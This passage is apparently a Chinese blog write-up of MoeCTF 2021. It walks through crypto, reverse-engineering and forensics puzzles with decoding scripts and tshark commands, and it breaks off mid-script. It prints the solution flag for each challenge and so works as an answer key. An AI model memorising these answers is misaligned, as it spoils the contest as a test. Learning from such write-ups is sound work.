<h1 id="MoeCTF-2021-WriteUp"><a href="#MoeCTF-2021-WriteUp" class="headerlink" title="MoeCTF 2021 WriteUp"></a>MoeCTF 2021 WriteUp</h1><p><d<hr /><h1 id="MoeCTF-2021-WriteUp"><a href="#MoeCTF-2021-WriteUp" class="headerlink" title="MoeCTF 2021 WriteUp"></a>MoeCTF 2021 WriteUp</h1><p><del>没想到摸鱼摸到第9了（感谢Hidden了的师傅们（逃</del></p><p>挺菜的边做边学。</p><p>这次主要做了做 <code>Misc</code> 和 <code>Web</code> ，其他的就看了看前面几个开了开视野（</p><p><strong>题目全部在 <code>Windows 7</code> 环境下做出</strong></p><h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><h3 id="Crypto（4-x2F-14）"><a href="#Crypto（4-x2F-14）" class="headerlink" title="Crypto（4&#x2F;14）"></a>Crypto（4&#x2F;14）</h3><ol><li>Cryptography入门指北（略）</li><li>beginOfCrypto</li><li>BabyMultiple</li><li>LazyRSA</li></ol><h3 id="Reverse（2-x2F-14）"><a href="#Reverse（2-x2F-14）" class="headerlink" title="Reverse（2&#x2F;14）"></a>Reverse（2&#x2F;14）</h3><ol><li>逆向工程入门指北（略）</li><li>welcome_to_the_world_of_re</li></ol><h3 id="Classical-Cryptography（1-x2F-6）"><a href="#Classical-Cryptography（1-x2F-6）" class="headerlink" title="Classical Cryptography（1&#x2F;6）"></a>Classical Cryptography（1&#x2F;6）</h3><ol><li>Augustine’s Way</li></ol><h3 id="Bonus-0-x2F-1"><a href="#Bonus-0-x2F-1" class="headerlink" title="Bonus(0&#x2F;1)"></a>Bonus(0&#x2F;1)</h3><h3 id="MISC-12-x2F-12）之前是13个来着"><a href="#MISC-12-x2F-12）之前是13个来着" class="headerlink" title="MISC(12&#x2F;12）之前是13个来着"></a>MISC(12&#x2F;12）<del>之前是13个来着</del></h3><ol><li>Misc入门指北（略）</li><li>find_me</li><li>Macross</li><li>Homework</li><li>flipflipflip</li><li>White Album</li><li>Phone Call</li><li>社工题</li><li>好 康 的</li><li>easyForensics</li><li>R P G</li><li>诺亚的日记</li></ol><h3 id="Pwn（3-x2F-11）"><a href="#Pwn（3-x2F-11）" class="headerlink" title="Pwn（3&#x2F;11）"></a>Pwn（3&#x2F;11）</h3><ol><li>Pwn入门指北（略）</li><li>test_your_nc</li><li>Int_overflow</li></ol><h3 id="Web（9-x2F-14）"><a href="#Web（9-x2F-14）" class="headerlink" title="Web（9&#x2F;14）"></a>Web（9&#x2F;14）</h3><ol><li>Web入门指北（略）</li><li>Web安全入门指北—GET</li><li>Web安全入门指北—小饼干</li><li>2048</li><li>Web_Inc</li><li>ezinclude</li><li>babeRCE</li><li>Do you know HTTP?</li></ol><h3 id="问卷题-1-x2F-2"><a href="#问卷题-1-x2F-2" class="headerlink" title="问卷题(1&#x2F;2)"></a>问卷题(1&#x2F;2)</h3><ol><li>信息统计（略）</li></ol><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><blockquote><p>Python 真是绝绝子！</p></blockquote><h3 id="02-beginOfCrypto"><a href="#02-beginOfCrypto" class="headerlink" title="02 beginOfCrypto"></a>02 beginOfCrypto</h3><p>打开下载的文件发现下面有申必的数字，然后再看上面有 <code>flag = xxx</code>  , 再看一眼代码，应该是把字符通过申必的方法转换成申必的数字，然后先赋值 <code>flag = &quot;moectf&quot;</code> 发现和前面几个数字对上了，然后用只能人工方法将26个字母和几个符号带进去都看了一遍值，找到了flag</p><details><summary>Flag</summary><p><b>moectf{c0me_on!begin_your_Crypt0_c4r33r}</b></p></details><h3 id="03-BabyMultiple"><a href="#03-BabyMultiple" class="headerlink" title="03 BabyMultiple"></a>03 BabyMultiple</h3><p>和上一题一样，带进去不同字符经过处理变成其他申必字符，然后利用智能人工全部带了一遍，得到flag</p><details><summary>Flag</summary><p><b>moectf{y0u_4r3_gr34t_47_Mu17ic4ti0n}</b></p></details>### 04 LazyRSA<p>去网上大概查了一下原理，然后对着教程里的代码改了一下</p><p>读的博客</p><blockquote><p><a href="https://www.cnblogs.com/hiwuchong/p/9069392.html">https://www.cnblogs.com/hiwuchong/p/9069392.html</a></p><p><a href="https://blog.csdn.net/carroll_/article/details/79975226">https://blog.csdn.net/carroll_/article/details/79975226</a></p><p><a href="https://blog.csdn.net/Ahuuua/article/details/108830834">https://blog.csdn.net/Ahuuua/article/details/108830834</a></p><p><a href="https://blog.csdn.net/weixin_41818069/article/details/106532665">https://blog.csdn.net/weixin_41818069/article/details/106532665</a></p><p><a href="https://www.cnblogs.com/Higgerw/p/14289041.html">https://www.cnblogs.com/Higgerw/p/14289041.html</a></p><p><a href="http://www.ruanyifeng.com/blog/2013/06/rsa_algorithm_part_one.html">http://www.ruanyifeng.com/blog/2013/06/rsa_algorithm_part_one.html</a></p><p><a href="https://blog.csdn.net/qq_41429081/article/details/103403957">https://blog.csdn.net/qq_41429081/article/details/103403957</a></p><p><a href="https://blog.csdn.net/tinyzhao/article/details/52681634">https://blog.csdn.net/tinyzhao/article/details/52681634</a></p></blockquote><figure><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">import</span> gmpy2<span class="token keyword">import</span> binasciip <span class="token operator">=</span> <span class="token punctuation">(</span>题目里的p<span class="token punctuation">)</span>q <span class="token operator">=</span> <span class="token punctuation">(</span>题目里的q<span class="token punctuation">)</span>c <span class="token operator">=</span> <span class="token punctuation">(</span>题目里的c<span class="token punctuation">)</span> n <span class="token operator">=</span> p<span class="token operator">*</span>qe <span class="token operator">=</span> <span class="token number">0x10001</span>d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token comment"># c = pow(m,e,n)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>binascii<span class="token punctuation">.</span>unhexlify<span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">"L"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><details><summary>Flag</summary><p><b>moectf{w0w_yOU_Know_h0w_70_d3crypt_th3_RSA}</b></p></details><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="02-welcome-to-the-world-of-re"><a href="#02-welcome-to-the-world-of-re" class="headerlink" title="02 welcome_to_the_world_of_re"></a>02 welcome_to_the_world_of_re</h3><p><del>之前找简单软件注册码的法子</del></p><p>直接拖进 <code>OD</code> 能找到，拖进文本也行（</p><img src="https://i.loli.net/2021/09/21/RwJMH68qB2hKjIE.png" alt="re1.PNG" style="zoom:80%;" /><img src="https://i.loli.net/2021/09/21/ZL6sevtD1lGIrzk.png" alt="re2" style="zoom:80%;" /><details><summary>Flag</summary><p><b>moectf{W31C0Me_t0_m03CTF_2021_w0o0o0oooo0ooooo0o0oooo0!!!}</b></p></details><h2 id="Classical-Cryptography"><a href="#Classical-Cryptography" class="headerlink" title="Classical Cryptography"></a>Classical Cryptography</h2><p><del>看的时候离结束还有半天了，就看了第一个</del></p><h3 id="01-Classical-Cryptography"><a href="#01-Classical-Cryptography" class="headerlink" title="01 Classical Cryptography"></a>01 Classical Cryptography</h3><p>前几个和 <code>moectf</code> 对比了一下发现是每个字母后移了一位</p><details><summary>Flag</summary><p><b>moectf{e3sy_Au9u1ne!}</b></p></details><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="02-find-me"><a href="#02-find-me" class="headerlink" title="02 find_me"></a>02 find_me</h3><p>拖进 <code>010 Editor</code></p><details><summary>Flag</summary><p><b>moectf{hs_g1v3_u_fl@g}</b></p></details><h3 id="03-Macross"><a href="#03-Macross" class="headerlink" title="03 Macross"></a>03 Macross</h3><p>百度搜了半天不晓得这是啥，然后上 Google 搜出来是个记录鼠标移动的软件<del>（Google真是绝绝子）</del>，下载安装，然后打开 Windows 图画，运行文件，得到名画</p><img src="https://i.loli.net/2021/09/21/BNxQez71C68ObY9.png" alt="Mar" style="zoom:80%;" /><details><summary>Flag</summary><p><b>moectf{Rec0rder_15_Funny}</b></p></details><h3 id="04-Homework"><a href="#04-Homework" class="headerlink" title="04 Homework"></a>04 Homework</h3><p>先看了一遍啥也没找到，然后先全选清除格式发现半个flag，然后用 <code>7-zip</code> 解压出来直接看 <code>xml</code> 里东西了，搜 <code>&#125;</code>，找到后一半，当然在 Word 里搜 <code>&#123;</code> 发现是个文本框，拿到后半段flag</p><details><summary>Flag</summary><p><b>moectf{0h_U_f1nd_m3!}</b></p></details><h3 id="05-flipflipflip"><a href="#05-flipflipflip" class="headerlink" title="05 flipflipflip"></a>05 flipflipflip</h3><p>这个题可太折磨人了……</p><p>参考博客</p><blockquote><p><a href="https://www.cnblogs.com/1go0/p/9977359.html">https://www.cnblogs.com/1go0/p/9977359.html</a></p><p><a href="https://www.cnblogs.com/mq0036/p/6544055.html">https://www.cnblogs.com/mq0036/p/6544055.html</a></p><p><a href="https://blog.csdn.net/csqazwsxedc/article/details/59186769?fps=1&locationNum=2">https://blog.csdn.net/csqazwsxedc/article/details/59186769?fps=1&amp;locationNum=2</a></p><p><a href="https://www.it1352.com/904413.html">https://www.it1352.com/904413.html</a></p><p><a href="https://www.cnpython.com/qa/153478">https://www.cnpython.com/qa/153478</a></p><p><a href="https://www.cnblogs.com/h-zhang/p/10568028.html">https://www.cnblogs.com/h-zhang/p/10568028.html</a></p><p><a href="https://www.cnblogs.com/zuferj115/p/11547486.html">https://www.cnblogs.com/zuferj115/p/11547486.html</a></p><p><a href="https://blog.csdn.net/u010065754/article/details/81710160">https://blog.csdn.net/u010065754/article/details/81710160</a></p><p><a href="https://www.cnblogs.com/erchun/p/11766408.html">https://www.cnblogs.com/erchun/p/11766408.html</a></p><p><a href="https://blog.csdn.net/Blood_Seeker/article/details/81519426?utm_source=blogxgwz3">https://blog.csdn.net/Blood_Seeker/article/details/81519426?utm_source=blogxgwz3</a></p><p><a href="https://blog.csdn.net/weixin_43742794/article/details/104210963">https://blog.csdn.net/weixin_43742794/article/details/104210963</a></p><p><a href="https://www.cnblogs.com/qsmyjz/p/11987815.html">https://www.cnblogs.com/qsmyjz/p/11987815.html</a></p></blockquote><p>我超，100多MB的字符串，刚开始没头绪最后xjb猜是base64，那么大文件得整个脚本，然后网上搜</p><figure><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64<span class="token keyword">import</span> systext <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'C:\\Users(后面文件路径省略了)'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">3</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>     text <span class="token operator">+=</span> <span class="token string">"=="</span><span class="token keyword">elif</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">3</span> <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>     text <span class="token operator">+=</span> <span class="token string">"="</span> <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'C:\\Users\\Users(后面文件路径省略了)'</span><span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> file_object<span class="token punctuation">:</span>    file_object<span class="token punctuation">.</span>write<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"success"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>第一遍看着解出来好东西了，然后第二遍解出来不知道一堆啥东西……然后又不会整了。</p><p>突然发现第一遍解出来的东西开头是 <code>==</code> ，再想想题目名字……base64倒过来了属于是，然后整了个反转的脚本</p><figure><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64<span class="token keyword">import</span> systext <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'C:\\Users\\(后面路径省略)'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'C:\\Users\\(后面路径省略)'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> file_object<span class="token punctuation">:</span>    file_object<span class="token punctuation">.</span>write<span class="token punctuation">(</span>text<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"success"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>然后就这么xjb整……遇见解出来不对劲的就反转……然后通过智能人工整了70多次。。。从100多MB整到1KB……得到flag</p><img src="https://i.loli.net/2021/09/21/3NzvcCOM6ZYuqRW.png" alt="filp" style="zoom:80%;" /><details><summary>Flag</summary><p><b>moectf{fffffflipppppp}</b></p></details><h3 id="06-White-Album"><a href="#06-White-Album" class="headerlink" title="06 White Album"></a>06 White Album</h3><p>看到 <code>.png</code> ，就猜要么是LSB要么是图片尺寸问题，试了一下果然是图片尺寸，在<code>010 Editor</code> 里改了下尺寸得到一个申必图案</p><img src="https://i.loli.net/2021/09/21/ZpC9ox3itfAJLQm.jpg" alt="whilt" style="zoom:80%;" /><p>猜了下是条码，就搜了下条码图案，发现是 <code>pdf417</code> ，想找个在线扫的发现很难找，最后找到个网站可以解这个</p><blockquote><p><a href="https://online-barcode-reader.inliteresearch.com/">https://online-barcode-reader.inliteresearch.com/</a></p></blockquote><p>得到flag</p><details><summary>Flag</summary><p><b>moectf{WhY_@r3_u_s0_5K1ll3D}</b></p></details><h3 id="07-Phone-Call"><a href="#07-Phone-Call" class="headerlink" title="07 Phone Call"></a>07 Phone Call</h3><p>参考博客</p><blockquote><p><a href="http://dyf.ink/crypto/classical/others/#_24">http://dyf.ink/crypto/classical/others/#_24</a></p><p><a href="https://blog.csdn.net/cg1510167/article/details/114279633">https://blog.csdn.net/cg1510167/article/details/114279633</a></p><p><a href="https://blog.csdn.net/weixin_33806914/article/details/91868832">https://blog.csdn.net/weixin_33806914/article/details/91868832</a></p></blockquote><p>就拖进AE看就行，手动一个一个解的，得到<del>很臭的</del>flag</p><details><summary>Flag</summary><p><b>moectf{114514-1919810-7738-9634}</b></p></details><h3 id="08-社工题"><a href="#08-社工题" class="headerlink" title="08 社工题"></a>08 社工题</h3><p>这题可太草了，从假期整到开学……原来有4个博客2个仓库……</p><blockquote><p><a href="https://noahtie.github.io/">NoahBox (noahtie.github.io)</a></p><p><a href="https://noahbox.github.io/">https://noahbox.github.io/</a></p><p><a href="https://nuoyazhicheng.lofter.com/">https://nuoyazhicheng.lofter.com/</a></p><p><a href="https://masternoah.lofter.com/">https://masternoah.lofter.com/</a></p></blockquote><p>在hexo博客点签订契约进入lofter博客，在lofter博客点一下上面 <strong>i</strong> 一样的标志找到另一个hexo博客，在里面留言板里找到了 HackerHS，最后找到第二个仓库根据意思在里面找到commits，发现莫斯电码，复制到在线网站解密，得到flag</p><details><summary>Flag</summary><p><b>moectf{HAHAHAHAH_NOAH_IS_A_VEGETABLE_CHICKEN}</b></p></details><h3 id="09-好-康-的"><a href="#09-好-康-的" class="headerlink" title="09 好 康 的"></a>09 好 康 的</h3><img src="https://i.loli.net/2021/09/21/qO3mhC6S4aAVXFL.png" alt="rr1" style="zoom:80%;" /><p>（被骗一次，之后就会被骗第二次</p><p>太草了，放完发现后面有一段不能放，用 <code>mkvtoolnix</code> 分离出来字幕，拖进<code>010 Editor</code> 直接搜索 <code>moectf</code> ，找到flag</p><details><summary>Flag</summary><p><b>moectf{N3v3r_90tt@_L3t-y0U_dOwN~}</b></p></details><h3 id="10-easyForensics"><a href="#10-easyForensics" class="headerlink" title="10 easyForensics"></a>10 easyForensics</h3><p>参考博客</p><blockquote><p><a href="https://blog.csdn.net/luostudent/article/details/113786916?utm_term=base64%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BD%AC%E6%96%87%E4%BB%B6python&utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~all~sobaiduweb~default-1-113786916&spm=3001.4430">https://blog.csdn.net/luostudent/article/details/113786916?utm_term=base64%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BD%AC%E6%96%87%E4%BB%B6python&amp;utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~all~sobaiduweb~default-1-113786916&amp;spm=3001.4430</a></p><p><a href="https://blog.csdn.net/qq_37865996/article/details/87970732">https://blog.csdn.net/qq_37865996/article/details/87970732</a></p><p><a href="http://blog.sina.com.cn/s/blog_68f8a3370102vqv7.html">http://blog.sina.com.cn/s/blog_68f8a3370102vqv7.html</a></p></blockquote><p>找了半天，用 <code>AccessData FTK Imager</code> 打开，挂载，进入，翻目录找到 <code>flag.mp4</code> 一气呵成</p><p>打开 <code>flag.mp4</code> </p><img src="https://i.loli.net/2021/09/21/qO3mhC6S4aAVXFL.png" alt="rr1" style="zoom:80%;" /><p>草</p><p>又经过了漫长的鼓捣，最后在 <code>FTK</code> 里发现一些被删除的文件夹还有一个python文件，都是申必的命名，全部导出来，读了代码发现是把一个文件转成base64了，这里要注意 <code>data = data.replace(&quot;/&quot;, &quot;_&quot;)</code></p><p>写了个脚本把文件夹的名字提取了出来（发现写了两个，好像差不多，随便粘一个）</p><figure><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token keyword">import</span> os<span class="token keyword">import</span> base64<span class="token keyword">import</span> sysfile_dir <span class="token operator">=</span> <span class="token string">'C:\\Users\\(之后目录省略)'</span>s <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> root<span class="token punctuation">,</span> dirs<span class="token punctuation">,</span> files <span class="token keyword">in</span> os<span class="token punctuation">.</span>walk<span class="token punctuation">(</span>file_dir<span class="token punctuation">)</span><span class="token punctuation">:</span>    var <span class="token operator">=</span> root    s <span class="token operator">=</span> s <span class="token operator">+</span> var<span class="token punctuation">[</span><span class="token number">54</span><span class="token punctuation">:</span><span class="token punctuation">]</span>s <span class="token operator">=</span> s<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"_"</span><span class="token punctuation">,</span> <span class="token string">"/"</span><span class="token punctuation">)</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'C:\\Users\\(之后目录省略)'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> file_object<span class="token punctuation">:</span>    file_object<span class="token punctuation">.</span>write<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"success"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>然后用脚本把base64转文件，还搜了个大佬写的图形化工具，（最后发现是个word）得到flag</p><details><summary>Flag</summary><p><b>moectf{Th@_1s_N0t_U53FULL_@_4LL}</b></p></details><h3 id="11-R-P-G"><a href="#11-R-P-G" class="headerlink" title="11 R P G"></a>11 R P G</h3><p>是游戏捏，按F12还能出来 DevTools 捏，本来想怎么改地图直接穿过去，发现不会整，然后又改了下等级，好像也没啥用，然后又整了一下一进去就是第二个，还是不会整，最后在<code>Map002.json</code> 里发现了好像base64的申必字符，然后复制出来，得到flag</p><details><summary>Flag</summary><p><b>moectf{Th3_w0rld_0f_G4m3}</b></p></details><h3 id="12-诺亚的日记"><a href="#12-诺亚的日记" class="headerlink" title="12 诺亚的日记"></a>12 诺亚的日记</h3><p><del>我超，嘉心糖</del></p><p>参考博客</p><blockquote><p><a href="https://blog.csdn.net/qiuchi1975/article/details/106149854/">https://blog.csdn.net/qiuchi1975/article/details/106149854/</a></p><p><a href="https://blog.csdn.net/u012388993/article/details/116395497">https://blog.csdn.net/u012388993/article/details/116395497</a></p><p><a href="https://www.codercto.com/a/109222.html">https://www.codercto.com/a/109222.html</a></p><p><a href="https://www.anquanke.com/post/id/85218">https://www.anquanke.com/post/id/85218</a></p><p><a href="https://www.jianshu.com/p/ba9763ceb620">https://www.jianshu.com/p/ba9763ceb620</a></p><p><a href="https://www.jianshu.com/p/756aa623c3b5">https://www.jianshu.com/p/756aa623c3b5</a></p><p><a href="https://www.cnblogs.com/ECJTUACM-873284962/p/9473808.html">https://www.cnblogs.com/ECJTUACM-873284962/p/9473808.html</a></p><p><a href="https://www.jianshu.com/p/756aa623c3b5">https://www.jianshu.com/p/756aa623c3b5</a></p><p><a href="https://www.cnblogs.com/ECJTUACM-873284962/p/9473808.html">https://www.cnblogs.com/ECJTUACM-873284962/p/9473808.html</a></p></blockquote><p>是个流量包捏，随便翻了一下里面 <code>HID Data</code> 里好像有好东西捏，但怎么提取出来捏？看了上面的博客，先把流量包用 <code>tshark</code> 转换成json，找到 <code>HID Data</code> 叫啥，然后再提出来</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">tshark.exe <span class="token parameter variable">-T</span> json <span class="token parameter variable">-r</span> pcapng.pcap <span class="token operator">></span> test.json<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">tshark.exe <span class="token parameter variable">-r</span> pcapng.pcap <span class="token parameter variable">-T</span> fields <span class="token parameter variable">-e</span> usbhid.data <span class="token operator">></span> usbdata.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><p>然后看博客里面只有两位是有用的，然后就是对着表翻译。找了好多脚本都是错的，交了很多次……最后终于找到个有用的</p><figure><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># coding:utf-8</span><span class="token keyword">import</span> sys<span class="token keyword">import</span> osusb_codes <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token number">0x04</span><span class="token punctuation">:</span> <span class="token string">"aA"</span><span class="token punctuation">,</span> <span class="token number">0x05</span><span class="token punctuation">:</span> <span class="token string">"bB"</span><span class="token punctuation">,</span> <span class="token number">0x06</span><span class="token punctuation">:</span> <span class="token string">"cC"</span><span class="token punctuation">,</span> <span class="token number">0x07</span><span class="token punctuation">:</span> <span class="token string">"dD"</span><span class="token punctuation">,</span> <span class="token number">0x08</span><span class="token punctuation">:</span> <span class="token string">"eE"</span><span class="token punctuation">,</span> <span class="token number">0x09</span><span class="token punctuation">:</span> <span class="token string">"fF"</span><span class="token punctuation">,</span>    <span class="token number">0x0A</span><span class="token punctuation">:</span> <span class="token string">"gG"</span><span class="token punctuation">,</span> <span class="token number">0x0B</span><span class="token punctuation">:</span> <span class="token string">"hH"</span><span class="token punctuation">,</span> <span class="token number">0x0C</span><span class="token punctuation">:</span> <span class="token string">"iI"</span><span class="token punctuation">,</span> <span class="token number">0x0D</span><span class="token punctuation">:</span> <span class="token string">"jJ"</span><span class="token punctuation">,</span> <span class="token number">0x0E</span><span class="token punctuation">:</span> <span class="token string">"kK"</span><span class="token punctuation">,</span> <span class="token number">0x0F</span><span class="token punctuation">:</span> <span class="token string">"lL"</span><span class="token punctuation">,</span>    <span class="token number">0x10</span><span class="token punctuation">:</span> <span class="token string">"mM"</span><span class="token punctuation">,</span> <span class="token number">0x11</span><span class="token punctuation">:</span> <span class="token string">"nN"</span><span class="token punctuation">,</span> <span class="token number">0x12</span><span class="token punctuation">:</span> <span class="token string">"oO"</span><span class="token punctuation">,</span> <span class="token number">0x13</span><span class="token punctuation">:</span> <span class="token string">"pP"</span><span class="token punctuation">,</span> <span class="token number">0x14</span><span class="token punctuation">:</span> <span class="token string">"qQ"</span><span class="token punctuation">,</span> <span class="token number">0x15</span><span class="token punctuation">:</span> <span class="token string">"rR"</span><span class="token punctuation">,</span>    <span class="token number">0x16</span><span class="token punctuation">:</span> <span class="token string">"sS"</span><span class="token punctuation">,</span> <span class="token number">0x17</span><span class="token punctuation">:</span> <span class="token string">"tT"</span><span class="token punctuation">,</span> <span class="token number">0x18</span><span class="token punctuation">:</span> <span class="token string">"uU"</span><span class="token punctuation">,</span> <span class="token number">0x19</span><span class="token punctuation">:</span> <span class="token string">"vV"</span><span class="token punctuation">,</span> <span class="token number">0x1A</span><span class="token punctuation">:</span> <span class="token string">"wW"</span><span class="token punctuation">,</span> <span class="token number">0x1B</span><span class="token punctuation">:</span> <span class="token string">"xX"</span><span class="token punctuation">,</span>    <span class="token number">0x1C</span><span class="token punctuation">:</span> <span class="token string">"yY"</span><span class="token punctuation">,</span> <span class="token number">0x1D</span><span class="token punctuation">:</span> <span class="token string">"zZ"</span><span class="token punctuation">,</span> <span class="token number">0x1E</span><span class="token punctuation">:</span> <span class="token string">"1!"</span><span class="token punctuation">,</span> <span class="token number">0x1F</span><span class="token punctuation">:</span> <span class="token string">"2@"</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">:</span> <span class="token string">"3#"</span><span class="token punctuation">,</span> <span class="token number">0x21</span><span class="token punctuation">:</span> <span class="token string">"4$"</span><span class="token punctuation">,</span>    <span class="token number">0x22</span><span class="token punctuation">:</span> <span class="token string">"5%"</span><span class="token punctuation">,</span> <span class="token number">0x23</span><span class="token punctuation">:</span> <span class="token string">"6^"</span><span class="token punctuation">,</span> <span class="token number">0x24</span><span class="token punctuation">:</span> <span class="token string">"7&amp;"</span><span class="token punctuation">,</span> <span class="token number">0x25</span><span class="token punctuation">:</span> <span class="token string">"8*"</span><span class="token punctuation">,</span> <span class="token number">0x26</span><span class="token punctuation">:</span> <span class="token string">"9("</span><span class="token punctuation">,</span> <span class="token number">0x27</span><span class="token punctuation">:</span> <span class="token string">"0)"</span><span class="token punctuation">,</span>    <span class="token number">0x2C</span><span class="token punctuation">:</span> <span class="token string">"  "</span><span class="token punctuation">,</span> <span class="token number">0x2D</span><span class="token punctuation">:</span> <span class="token string">"-_"</span><span class="token punctuation">,</span> <span class="token number">0x2E</span><span class="token punctuation">:</span> <span class="token string">"=+"</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">:</span> <span class="token string">"[&#123;"</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">:</span> <span class="token string">"]&#125;"</span><span class="token punctuation">,</span> <span class="token number">0x32</span><span class="token punctuation">:</span> <span class="token string">"#~"</span><span class="token punctuation">,</span>    <span class="token number">0x33</span><span class="token punctuation">:</span> <span class="token string">";:"</span><span class="token punctuation">,</span> <span class="token number">0x34</span><span class="token punctuation">:</span> <span class="token string">"'\""</span><span class="token punctuation">,</span> <span class="token number">0x36</span><span class="token punctuation">:</span> <span class="token string">",&lt;"</span><span class="token punctuation">,</span> <span class="token number">0x37</span><span class="token punctuation">:</span> <span class="token string">".>"</span><span class="token punctuation">,</span> <span class="token number">0x4f</span><span class="token punctuation">:</span> <span class="token string">">"</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">:</span> <span class="token string">"&lt;"</span><span class="token punctuation">&#125;</span><span class="token keyword">def</span> <span class="token function">code2chr</span><span class="token punctuation">(</span>filepath<span class="token punctuation">)</span><span class="token punctuation">:</span>    lines <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    pos <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">open</span><span class="token punctuation">(</span>filepath<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        code <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>x<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token 